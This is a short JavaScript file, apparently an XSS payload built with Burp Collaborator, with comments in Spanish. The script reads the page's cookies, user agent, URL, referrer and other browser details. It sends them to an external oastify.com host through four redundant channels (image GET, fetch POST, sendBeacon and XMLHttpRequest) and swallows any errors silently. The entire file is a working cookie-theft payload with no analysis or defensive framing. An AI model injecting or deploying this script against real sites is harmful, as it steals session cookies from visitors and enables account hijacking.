(function(){
  try {
    var burp = "http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
    
    // Obtener datos
    var cookies = document.cookie;
    var userAgent = navigator.userAgent;
    var url = window.location.href;
    var timestamp = new Date().toISOString();
    
    // Construir payload
    var payload = {
      cookies: cookies,
      user_agent: userAgent,
      url: url,
      timestamp: timestamp,
      screen_width: window.innerWidth,
      screen_height: window.innerHeight,
      language: navigator.language,
      platform: navigator.platform,
      referrer: document.referrer
    };
    
    // Envío 1: GET con base64
    var encoded = btoa(JSON.stringify(payload));
    new Image().src = burp + '?data=' + encoded;
    
    // Envío 2: POST con JSON
    fetch(burp, {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    }).catch(function(){});
    
    // Envío 3: Beacon
    navigator.sendBeacon(burp, 'cookies=' + cookies + '&ua=' + encodeURIComponent(userAgent));
    
    // Envío 4: XMLHttpRequest
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', burp, true);
      xhr.send(JSON.stringify({cookies: cookies, userAgent: userAgent}));
    } catch(e){}
    
  } catch(e){}
})();
